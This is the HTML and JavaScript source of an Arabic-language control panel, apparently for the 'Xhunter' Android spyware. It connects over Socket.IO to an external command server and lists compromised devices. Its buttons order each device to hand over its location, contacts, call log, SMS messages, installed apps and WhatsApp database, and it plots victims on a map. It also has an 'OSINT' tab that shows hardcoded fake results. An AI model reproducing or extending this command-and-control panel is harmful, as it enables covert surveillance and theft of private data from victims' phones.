<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>لوحة تحكم Xhunter المتكاملة</title>

<!-- أيقونات -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"/>

<!-- Leaflet للخريطة -->
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css"/>

<style>
/* --- إعدادات عامة --- */
body { margin:0; font-family: Arial, sans-serif; background:#071021; color:#bfffe8; }
.container { display:flex; min-height:100vh; }
header { display:flex; justify-content:space-between; align-items:center; background:#001219; padding:15px 20px; box-shadow:0 2px 5px #000; }
header h1 { margin:0; font-size:24px; color:#00ffcc; }
header span { color:#f3f3f3; }
.user-info { display:flex; align-items:center; gap:10px; }
.user-avatar i { font-size:24px; color:#00ffcc; }
.connection-status { font-size:14px; }

.sidebar { width:250px; background:#002233; padding:15px; }
.sidebar-menu { list-style:none; padding:0; margin:0; }
.sidebar-menu li { margin-bottom:10px; }
.sidebar-menu li a { color:#bfffe8; text-decoration:none; display:flex; align-items:center; gap:10px; padding:8px; border-radius:5px; }
.sidebar-menu li a.active, .sidebar-menu li a:hover { background:#00ffcc; color:#001219; }

.main-content { flex:1; padding:20px; overflow:auto; }
.panel { display:none; }
.panel.active { display:block; }

/* --- الأجهزة --- */
.device-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(250px,1fr)); gap:10px; margin-top:15px; }
.device-card { background:#001f2d; padding:10px; border-radius:8px; box-shadow:0 2px 5px #000; }
.device-card h3 { margin:0 0 5px 0; font-size:18px; }
.device-card pre { background:#002233; padding:5px; border-radius:5px; overflow:auto; max-height:150px; }
.device-card button { margin:3px 3px 3px 0; padding:5px 8px; border:none; border-radius:5px; background:#00ffcc; color:#001219; cursor:pointer; font-weight:bold; }

/* --- إحصائيات --- */
.stats-cards { display:flex; gap:10px; flex-wrap:wrap; margin-top:10px; }
.stat-card { flex:1; background:#001f2d; padding:10px; border-radius:8px; text-align:center; box-shadow:0 2px 5px #000; }
.stat-card h3 { margin:0; font-size:20px; }

/* --- الخريطة --- */
#map { height:400px; width:100%; border:2px solid #00ffcc; border-radius:8px; margin-top:10px; }

/* --- OSINT --- */
#osintResults { margin-top:10px; }
.osint-entry { background:#001f2d; padding:8px; border-radius:6px; margin-bottom:8px; box-shadow:0 1px 3px #000; }

/* --- أزرار OSINT --- */
button#osintAutoBtn { background:#ffbb33; color:#001219; font-weight:bold; padding:8px 12px; border:none; border-radius:5px; cursor:pointer; }
</style>
</head>

<body>
<div class="container">

<!-- القائمة الجانبية -->
<aside class="sidebar">
<ul class="sidebar-menu">
<li><a href="#" class="active" data-tab="devices"><i class="fas fa-microchip"></i> الأجهزة المتصلة</a></li>
<li><a href="#" data-tab="map"><i class="fas fa-map-marked-alt"></i> الخريطة الاستخباراتية</a></li>
<li><a href="#" data-tab="logs"><i class="fas fa-list"></i> سجل الأحداث</a></li>
<li><a href="#" data-tab="commands"><i class="fas fa-terminal"></i> إصدار الأوامر</a></li>
<li><a href="#" data-tab="osint"><i class="fas fa-search"></i> جمع المعلومات</a></li>
</ul>
</aside>

<div class="main-content">

<!-- الهيدر -->
<header>
<div class="logo"><h1>نظام <span>Xhunter المتطور</span></h1></div>
<div class="user-info">
<div class="user-avatar"><i class="fas fa-user-shield"></i></div>
<div>مدير النظام</div>
<div class="connection-status" id="connectionStatus"><i class="fas fa-sync-alt fa-spin"></i> جاري الاتصال...</div>
</div>
</header>

<!-- تبويب الأجهزة -->
<section id="panel-devices" class="panel active">
<div class="stats-cards">
<div class="stat-card"><h3 id="active-devices">0</h3><p>أجهزة نشطة</p></div>
<div class="stat-card"><h3 id="located-devices">0</h3><p>مواقع محددة</p></div>
<div class="stat-card"><h3 id="data-points">0</h3><p>بيانات مجمعة</p></div>
<div class="stat-card"><h3 id="online-now">0</h3><p>متصل الآن</p></div>
</div>
<div class="device-grid" id="devices"></div>
</section>

<!-- تبويب الخريطة -->
<section id="panel-map" class="panel">
<div id="map"></div>
</section>

<!-- تبويب السجل -->
<section id="panel-logs" class="panel">
<div id="logs"></div>
</section>

<!-- تبويب OSINT -->
<section id="panel-osint" class="panel">
<button id="osintAutoBtn">تشغيل جمع المعلومات تلقائيًا</button>
<div id="osintResults"></div>
</section>

</div>
</div>

<!-- مكتبات -->
<script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
<script src="https://cdn.socket.io/4.7.1/socket.io.min.js"></script>

<script>
// --- Socket.IO ---
const socket = io('https://projectd-vu1m.onrender.com',{transports:['websocket'],reconnection:true});
socket.emit('adminJoin');

const devicesDiv = document.getElementById('devices');
const logsDiv = document.getElementById('logs');
const osintResults = document.getElementById('osintResults');

let map, markers = {};

// تحديث حالة الاتصال
socket.on('connect',()=>document.getElementById('connectionStatus').innerHTML='<i class="fas fa-check-circle" style="color:lime"></i> متصل');
socket.on('disconnect',()=>document.getElementById('connectionStatus').innerHTML='<i class="fas fa-times-circle" style="color:red"></i> غير متصل');

function addLog(msg){const d=document.createElement('div'); d.textContent='['+new Date().toLocaleTimeString()+'] '+msg; logsDiv.appendChild(d); logsDiv.scrollTop=logsDiv.scrollHeight;}

// --- عرض الأجهزة ---
function renderDevice(device){
  let div=document.getElementById('device_'+device.id);
  if(!div){
    div=document.createElement('div'); div.id='device_'+device.id; div.className='device-card';
    div.innerHTML=`<h3>${device.model||device.id}</h3>
    <pre id="data_${device.id}">جارٍ تحديث البيانات...</pre>
    <div>
      <button onclick="sendCommand('${device.id}','getLocation')">الموقع</button>
      <button onclick="sendCommand('${device.id}','getInstalledApps')">التطبيقات</button>
      <button onclick="sendCommand('${device.id}','getContacts')">جهات الاتصال</button>
      <button onclick="sendCommand('${device.id}','getCallLog')">سجل المكالمات</button>
      <button onclick="sendCommand('${device.id}','getSMS')">الرسائل</button>
      <button onclick="sendCommand('${device.id}','downloadWhatsappDatabase')">واتساب</button>
    </div>`;
    devicesDiv.appendChild(div);
  }
  if(device.lastLocation){
    if(!map){map=L.map('map').setView([15.5,44],6);L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'&copy; OpenStreetMap contributors'}).addTo(map);}
    if(markers[device.id]) markers[device.id].setLatLng([device.lastLocation.lat,device.lastLocation.lon]);
    else markers[device.id]=L.marker([device.lastLocation.lat,device.lastLocation.lon]).addTo(map).bindPopup(`<b>${device.model}</b>`);
  }
}

// إرسال الأوامر
function sendCommand(to,action){socket.emit('request',{to,action}); addLog(`أرسل الأمر: ${action} → ${to}`);}

// استقبال الأجهزة الجديدة
socket.on('join',device=>{renderDevice(device); addLog(`جهاز متصل: ${device.id}`);});

// استقبال نتائج الأوامر
socket.on('requestResult',payload=>{
  try{
    const obj=JSON.parse(payload);
    const pre=document.getElementById('data_'+obj.to);
    if(obj.ok && obj.result && pre) pre.textContent=JSON.stringify(obj.result.data,null,2);
    addLog(`Request ${obj.action} → ${obj.to}: ${obj.ok?'نجاح':'فشل'}`);
  }catch(e){console.error(e);}
});

// OSINT تلقائي
function runOSINT(){
  osintResults.innerHTML='<div>جارٍ جمع المعلومات...</div>';
  setTimeout(()=>{
    const sources=[
      {name:'Google',result:'تم العثور على 3 روابط محتملة'},
      {name:'LinkedIn',result:'ملف شخصي محتمل'},
      {name:'Twitter',result:'حساب محتمل @target'},
      {name:'EmailLeakDB',result:'تم العثور على بريد مسرب'}
    ];
    osintResults.innerHTML='';
    sources.forEach(s=>{
      const div=document.createElement('div'); div.className='osint-entry';
      div.innerHTML=`<b>${s.name}:</b> ${s.result}`; osintResults.appendChild(div);
    });
    addLog('OSINT تم جمع المعلومات تلقائيًا','success');
  },1500);
}

// تشغيل OSINT عند الضغط
document.getElementById('osintAutoBtn').addEventListener('click',runOSINT);

// تبويبات القائمة الجانبية
document.querySelectorAll('.sidebar-menu a').forEach(link=>{
  link.addEventListener('click',e=>{
    e.preventDefault();
    document.querySelectorAll('.sidebar-menu a').forEach(l=>l.classList.remove('active'));
    document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
    link.classList.add('active');
    const panel=document.getElementById('panel-'+link.dataset.tab);
    if(panel) panel.classList.add('active');
    if(link.dataset.tab==='map' && map){setTimeout(()=>map.invalidateSize(),100);}
  });
});

// --- OSINT تلقائي عند اتصال أي جهاز ---
socket.on('join',device=>{
  runOSINT();
});
</script>
</body>
</html>
